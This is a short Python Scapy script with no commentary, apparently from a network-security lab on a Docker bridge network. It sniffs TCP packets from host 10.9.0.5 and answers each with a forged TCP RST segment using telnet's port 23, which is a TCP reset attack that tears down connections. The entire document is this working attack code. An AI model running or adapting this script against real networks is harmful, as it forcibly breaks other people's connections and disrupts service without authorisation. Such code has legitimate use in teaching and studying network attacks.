#!/usr/bin/env python3
from scapy.all import *

def sniff_n_spoof(pkt):
	ip  = IP(src=pkt[IP].src, dst=pkt[IP].dst)
	tcp = TCP(sport=23, dport=pkt[TCP].dport, flags="R", seq=pkt[TCP].seq+1)
	pkt = ip/tcp
	ls(pkt)
	send(pkt, verbose=0)

pkt = sniff(iface='br-74481477aa6b', filter='tcp and src host 10.9.0.5', prn=sniff_n_spoof)
